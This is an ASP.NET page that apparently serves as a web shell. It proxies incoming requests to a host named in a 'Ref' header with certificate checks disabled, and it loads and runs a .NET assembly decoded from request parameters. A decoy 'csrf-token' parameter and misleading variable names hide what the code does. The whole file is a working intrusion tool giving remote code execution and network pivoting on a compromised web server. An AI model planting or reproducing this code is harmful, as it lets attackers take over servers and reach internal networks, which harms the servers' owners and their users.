<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@Import Namespace="System.Reflection"%>
<%

String refer=Request.Headers["Ref"];
String machine=Environment.MachineName;

bool isfor=refer.Contains(machine);
if(!isfor){
	byte[] byteArray= Request.BinaryRead(Request.ContentLength);
	Uri u = new Uri(refer);
	WebRequest request1 = WebRequest.Create(u);
	request1.Method = Request.HttpMethod;
	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
	System.Net.ServicePointManager.Expect100Continue = false;
	foreach(string kk in Request.Headers)
	{
		try{
			request1.Headers.Add(kk, Request.Headers.Get(kk));
		} catch (Exception e){
		}
	}
	 try{
        Stream body = request1.GetRequestStream();
        byte[] data =byteArray;
        body.Write(data, 0, data.Length);
        body.Close();
    } catch (Exception e){}
	
	try{
    HttpWebResponse response = (HttpWebResponse)request1.GetResponse();
    WebHeaderCollection webHeader = response.Headers;
    
	for (int i=0;i < webHeader.Count; i++)
    {
        string rkey = webHeader.GetKey(i);
        if (rkey != "Content-Length" && rkey != "Transfer-Encoding")
            Response.AddHeader(rkey, webHeader[i]);
    }
    StreamReader repBody = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
    string rbody = repBody.ReadToEnd();
    Response.AddHeader("Content-Length", rbody.Length.ToString());
    Response.Write(rbody);
	}catch (Exception e){
	Response.Write(e.Message);
	}
	}
else{
try{
var csrftoken=Request.Params["csrf-token"].Length;
String thisvar_modified_by_vlx=Request.Params["REDACTED"].Substring(csrftoken);
byte[] thisvar_modified_by_vlxbytes=new byte[thisvar_modified_by_vlx.Length/2];
for(int i=0;i<thisvar_modified_by_vlx.Length;i+=2)
{thisvar_modified_by_vlxbytes[i/2]=(byte)Convert.ToInt32(thisvar_modified_by_vlx.Substring(i,2),16);}
byte[] errors=Convert.FromBase64String(System.Text.Encoding.Default.GetString(thisvar_modified_by_vlxbytes));
Assembly.Load(errors).CreateInstance("REDACTED").GetHashCode();
}
 catch (Exception e)
{Response.Write(e.Message);}
}
%>